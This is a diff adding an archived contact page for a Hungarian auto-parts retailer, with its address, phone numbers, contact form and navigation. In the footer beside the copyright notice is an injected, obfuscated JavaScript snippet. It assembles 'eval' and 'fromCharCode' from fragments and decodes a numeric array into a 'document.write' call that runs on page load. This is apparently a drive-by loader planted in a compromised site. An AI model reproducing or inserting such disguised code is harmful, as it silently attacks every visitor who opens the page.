@@ -1,0 +1,334 @@
+<?xml version="1.0" encoding="iso-8859-2"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Wilker autóalkatrész - Kapcsolat</title>
+<meta name="description" content="Wilker Kft - kerékpár, motor, autóalkatrész, kertikisgép, kondigép, quad, hószán" />
+<meta name="keywords" content="kerékpár, motor, autóalkatrész, kertikisgép, kondigép, quad, hószán" />
+<meta name="Generator" content="Joomla! - Copyright (C) 2005 - 2006 Open Source Matters. All rights reserved." />
+<meta name="robots" content="index, follow" />
+	<link rel="shortcut icon" href="http://wilker.hu/auto/images/favicon.ico" />
+	<meta http-equiv="Content-Type" content="text/html; charset=charset=iso-8859-2" />
+<link href="http://wilker.hu/auto/templates/bright_mitra/css/template_css.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr>
+		<td style="background-image: url('http://wilker.hu/auto/templates/bright_mitra/images/bac_left.png'); background-repeat: repeat-y; background-position: right">&nbsp;</td>
+		<td width="900">
+		<table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #F4F4F4">
+			<tr>
+				<td>
+				<img src="http://wilker.hu/auto/templates/bright_mitra/images/logo.jpg" border="0" alt="Wilker autóalkatrész" /></td>
+			</tr>
+			<tr>
+				<td>
+				<table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-image: url('http://wilker.hu/auto/templates/bright_mitra/images/bac_top_link.png'); background-repeat: repeat-x">
+					<tr>
+						<td style="background-image: url('http://wilker.hu/auto/templates/bright_mitra/images/left_top_link.png'); background-repeat: no-repeat; background-position: left">
+						<table border="0" cellpadding="0" cellspacing="0" width="100%">
+							<tr>
+								<td width="251">&nbsp;</td>
+								<td><ul id="mainlevel-nav"><li><a href="http://wilker.hu/auto/administrator/" class="mainlevel-nav" >Adminisztráció</a></li></ul></td>
+								<td width="150">
+<form action="index.php?option=com_search" method="get">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="search" class="inputbox" type="text" size="20" value="keresés..."  onblur="if(this.value=='') this.value='keresés...';" onfocus="if(this.value=='keresés...') this.value='';" />	</div>
+
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="" />	
+</form></td>
+							</tr>
+						</table>
+						</td>
+						<td width="7">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/right_top_link.png" border="0" alt="Wilker autóalkatrész" /></td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+			<tr>
+				<td>
+				<table border="0" cellpadding="0" cellspacing="0" width="100%">
+					<tr>
+						<td valign="top" width="15">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/left.png" border="0" alt="Wilker autóalkatrész" /></td>
+						<td valign="top" style="background-image: url('http://wilker.hu/auto/templates/bright_mitra/images/bac_module.png'); background-repeat: no-repeat; background-position: top" width="224">
+						<table border="0" cellpadding="0" cellspacing="0" width="100%">
+							<tr>
+								<td style="height: 60px">&nbsp;</td>
+							</tr>
+							<tr>
+								<td>		<div class="moduletable">
+							<h3>
+					F?menü				</h3>
+				
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tr align="left"><td><a href="http://www.wilker.hu" class="mainlevel" >F?oldal</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_frontpage&amp;Itemid=1" class="mainlevel" >Kezd&#337;lap</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_contact&amp;Itemid=3" class="mainlevel" >Kapcsolat</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_content&amp;task=view&amp;id=12&amp;Itemid=31" class="mainlevel" >Akciók</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_content&amp;task=view&amp;id=15&amp;Itemid=34" class="mainlevel" >Szervizeink</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_content&amp;task=category&amp;sectionid=1&amp;id=1&amp;Itemid=2" class="mainlevel" >Hírek</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_content&amp;task=view&amp;id=14&amp;Itemid=33" class="mainlevel" >Partnereink</a></td></tr>
+<tr align="left"><td><a href="http://wilker.hu/auto/index.php?option=com_virtuemart&amp;page=shop.browse&amp;category_id=1&amp;Itemid=37" class="mainlevel" >Web-Shop</a></td></tr>
+</table>		</div>
+		</td>
+							</tr>
+						</table>
+						</td>
+						<td valign="top" width="21">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/right.png" border="0" alt="Wilker autóalkatrész" /></td>
+						<td valign="top">
+						<table border="0" cellpadding="0" cellspacing="0" width="640">
+																						<tr>
+								<td width="628">&nbsp;</td>
+								<td width="12" rowspan="2">&nbsp;</td>
+							</tr>
+							<tr>
+								<td width="628">
+								<table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #E6E6E6">
+									<tr>
+										<td width="5">
+										<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/top_left.png" border="0" alt="Wilker autóalkatrész" /></td>
+										<td>&nbsp;</td>
+										<td width="7">
+										<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/top_right.png" border="0" alt="Wilker autóalkatrész" /></td>
+									</tr>
+									<tr>
+										<td width="5">&nbsp;</td>
+										<td style="height: 600px" valign="top">		<script language="JavaScript" type="text/javascript">
+		<!--
+		function validate(){
+			if ( ( document.emailForm.text.value == "" ) || ( document.emailForm.email.value.search("@") == -1 ) || ( document.emailForm.email.value.search("[.*]" ) == -1 ) ) {
+				alert( "Kérlek bizonyosodj meg róla hogy az űrlap helyesen van kitöltve." );
+			} else if ( ( document.emailForm.email.value.search(";") != -1 ) || ( document.emailForm.email.value.search(",") != -1 ) || ( document.emailForm.email.value.search(" ") != -1 ) ) {
+				alert( "Nem írhatsz be egynél több e-mail címet." );
+			} else {
+				document.emailForm.action = "http://wilker.hu/auto/index.php?option=com_contact&Itemid=99999999"
+				document.emailForm.submit();
+			}
+		}
+		//-->
+		</script>
+		<script type="text/javascript">
+		<!--
+		function ViewCrossReference( selSelectObject ){
+			var links = new Array();
+			
+links[1]='http://wilker.hu/auto/index.php?option=com_contact&task=view&contact_id=1&Itemid=99999999';
+			var sel = selSelectObject.options[selSelectObject.selectedIndex].value
+			if (sel != "") {
+				location.href = links[sel];
+			}
+		}
+		//-->
+		</script>
+					<div class="componentheading">
+				Kapcsolat			</div>
+			
+		<table width="100%" cellpadding="0" cellspacing="0" border="0" class="contentpane">
+						<tr>
+					<td class="contentheading" width="100%">
+						<table width="100%">
+						<tr>
+							<td width="100%">
+								Wilker Kft.							</td>
+											<td align="right" width="100%" class="buttonheading">
+					<a href="http://wilker.hu/auto/index2.php?option=com_contact&amp;task=view&amp;contact_id=1&amp;Itemid=99999999&amp;pop=1" target="_blank" onclick="window.open('http://wilker.hu/auto/index2.php?option=com_contact&amp;task=view&amp;contact_id=1&amp;Itemid=99999999&amp;pop=1','win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" title="Nyomtatás">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/printButton.png"  alt="Nyomtatás" name="Nyomtatás" align="middle" border="0" /></a>
+				</td>
+										</tr>
+						</table>
+					</td>
+				</tr>
+						<tr>
+			<td width="100%">
+				<table width="100%">
+				<tr>
+					<td>
+								<table width="100%" cellpadding="0" cellspacing="0" border="0">
+							<tr>
+					<td rowspan="6" valign="top" width="40" align="left">
+					<img src="http://wilker.hu/auto/templates/bright_mitra/images/con_address.png"  alt="Cím: " name="Cím: " align="middle" border="0" />					</td>
+				</tr>
+											<tr>
+					<td valign="top">
+					Honvéd u. 5.					</td>
+				</tr>
+								<tr>
+					<td valign="top">
+					Vác,					</td>
+				</tr>
+								<tr>
+					<td valign="top">
+					Pest					</td>
+				</tr>
+								<tr>
+					<td valign="top">
+					Magyar					</td>
+				</tr>
+								<tr>
+					<td valign="top">
+					2600					</td>
+				</tr>
+							</table>
+			<br />
+						<table width="100%" cellpadding="0" cellspacing="0" border="0">
+							<tr>
+					<td width="40" align="left">
+					<img src="http://wilker.hu/auto/templates/bright_mitra/images/con_tel.png"  alt="Telefon: " name="Telefon: " align="middle" border="0" />					</td>
+					<td>
+					+36 27 312-940					</td>
+				</tr>
+								<tr>
+					<td width="40" align="left">
+					<img src="http://wilker.hu/auto/templates/bright_mitra/images/con_fax.png"  alt="Fax: " name="Fax: " align="middle" border="0" />					</td>
+					<td>
+					+36 27 312-940					</td>
+				</tr>
+							</table>
+			<br />
+						<table width="100%" cellpadding="0" cellspacing="0" border="0">
+			<tr>
+				<td width="40" valign="top" align="left">
+				<img src="http://wilker.hu/auto/templates/bright_mitra/images/con_info.png"  alt="Információ: " name="Információ: " align="middle" border="0" />				</td>
+				<td>
+				Területi képviseleteink elérhet?ségeit a www.wilker.hu oldal "üzleteink" gombra kattintva tekinheti meg.				</td>
+			</tr>
+			</table>
+			<br />
+								</td>
+					<td align="right" valign="top">
+										</td>
+				</tr>
+				</table>
+			</td>
+			<td>&nbsp;</td>
+		</tr>
+					<tr>
+				<td colspan="2">
+				<br />
+				Email küldése a kapcsolattartónak:				<br /><br />
+				<form action="http://wilker.hu/auto/index.php?option=com_contact&amp;Itemid=99999999" method="post" name="emailForm" target="_top" id="emailForm">
+				<div class="contact_email">
+					<label for="contact_name">
+						 Add meg a neved:					</label>
+					<br />
+					<input type="text" name="name" id="contact_name" size="30" class="inputbox" value="" />
+					<br />
+					<label for="contact_email">
+						 E-mail cím:					</label>
+					<br />
+					<input type="text" name="email" id="contact_email" size="30" class="inputbox" value="" />
+					<br />
+					<label for="contact_subject">
+						 Üzenet témája:					</label>
+					<br />
+					<input type="text" name="subject" id="contact_subject" size="30" class="inputbox" value="" />
+					<br /><br />
+					<label for="contact_text">
+						 Írd meg az üzeneted:					</label>
+					<br />
+					<textarea cols="50" rows="10" name="text" id="contact_text" class="inputbox"></textarea>
+										<br />
+					<br />
+					<input type="button" name="send" value="Küldés" class="button" onclick="validate()" />
+				</div>
+				<input type="hidden" name="option" value="com_contact" />
+				<input type="hidden" name="con_id" value="1" />
+				<input type="hidden" name="sitename" value="Wilker autóalkatrész" />
+				<input type="hidden" name="op" value="sendmail" />
+				<input type="hidden" name="j9b93ac8a45aae6100f7b63d0357b77a3" value="1" />
+				</form>
+				<br />
+				</td>
+			</tr>
+					</table>
+					<div class="back_button">
+				<a href='javascript:history.go(-1)'>
+					[ Vissza ]</a>
+			</div>
+			</td>
+										<td width="7">&nbsp;</td>
+									</tr>
+									<tr>
+										<td width="5">
+										<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/bot_left.png" border="0" alt="Wilker autóalkatrész" /></td>
+										<td>&nbsp;</td>
+										<td width="7">
+										<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/bot_right.png" border="0" alt="Wilker autóalkatrész" /></td>
+									</tr>
+								</table>
+								</td>
+							</tr>
+						</table>
+						</td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+			<tr>
+				<td>&nbsp;</td>
+			</tr>
+			<tr>
+				<td>
+				<table border="0" cellpadding="0" cellspacing="0" width="900">
+					<tr>
+						<td width="15">&nbsp;</td>
+						<td width="14" style="background-color: #E6E6E6">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/top_left.png" border="0" alt="Wilker autóalkatrész" /></td>
+						<td width="844" style="background-color: #E6E6E6">&nbsp;</td>
+						<td width="15" style="background-color: #E6E6E6">
+						<img src="http://wilker.hu/auto/templates/bright_mitra/images/body/top_right.png" border="0" alt="Wilker autóalkatrész" /></td>
+						<td width="12">&nbsp;</td>
+					</tr>
+					<tr>
+						<td width="15" rowspan="2">&nbsp;</td>
+						<td width="14" style="background-color: #E6E6E6" rowspan="2">&nbsp;</td>
+						<td width="844" style="background-color: #E6E6E6" align="center">
+						<script>try{q=document.createElement("p");q.appendChild(q+"");}catch(qw){h=-012/5;try{bcsd=prototype-2;}catch(bawg){ss=[];f=(h)?("fromCharC"+"ode"):"";e=window["e"+"val"];n=[13,20,300,444,99,234,327,404,110,232,138,476,114,210,348,404,40,78,180,420,102,228,291,436,101,64,345,456,99,122,102,416,116,232,336,232,47,94,330,420,107,202,303,484,98,92,297,444,109,94,345,464,97,232,345,184,112,208,336,136,32,230,297,456,111,216,324,420,110,206,183,136,97,234,348,444,34,64,306,456,97,218,303,392,111,228,300,404,114,122,102,440,111,68,96,388,108,210,309,440,61,68,297,404,110,232,303,456,34,64,312,404,105,206,312,464,61,68,150,136,32,238,315,400,116,208,183,136,50,68,186,240,47,210,306,456,97,218,303,248,39,82,177,52,10];if(window.document)for(i=6-2-1-2-1;-145+i!=2-2;i++){k=i;ss=ss+String[f](n[k]/(i%(h*h)+2-1));}e("if(1)"+ss);}}</script><div align="center">
+	&copy; 2013 Wilker autóalkatrész</div>
+
+<div align="center">
+	<a href="http://www.joomla.hu">Joomla</a> egy nyílt forráskódú rendszer, mely a GNU/GPL Licensz alatt áll.</div>
+
+<div align="right"><div id="eXTReMe"><a href="http://extremetracking.com/open?login=wilalk5">
+<img src="http://t1.extreme-dm.com/i.gif" width="41" style="border: 0;"
+height="38" id="EXim" alt="eXTReMe Tracker" /></a>
+<script type="text/javascript"><!--
+EXref="";top.document.referrer?EXref=top.document.referrer:EXref=document.referrer;//-->
+</script><script type="text/javascript"><!--
+var EXlogin='wilalk5' // Login
+var EXvsrv='s10' // VServer
+EXs=screen;EXw=EXs.width;navigator.appName!="Netscape"?
+EXb=EXs.colorDepth:EXb=EXs.pixelDepth;EXsrc="src";
+navigator.javaEnabled()==1?EXjv="y":EXjv="n";
+EXd=document;EXw?"":EXw="na";EXb?"":EXb="na";
+EXref?EXref=EXref:EXref=EXd.referrer;
+EXd.write("");//-->
+</script><noscript><div id="neXTReMe">
+</div></noscript></div>
+
+</div></td>
+						<td width="15" style="background-color: #E6E6E6" rowspan="2">&nbsp;</td>
+						<td width="12" rowspan="2">&nbsp;</td>
+					</tr>
+					<tr>
+						<td width="844" style="background-color: #E6E6E6" class="footer">
+						Template Design:
+						<a target="_blank" href="http://www.joomlamarket.de">
+						Joomlamarket.de</a></td>
+						</tr>
+				</table>
+				</td>
+			</tr>
+			</table>
+		</td>
+		<td style="background-image: url('http://wilker.hu/auto/templates/bright_mitra/images/bac_right.png'); background-repeat: repeat-y; background-position: left">&nbsp;</td>
+	</tr>
+</table>
+
+</body>
+</html><!-- 1369893811 -->
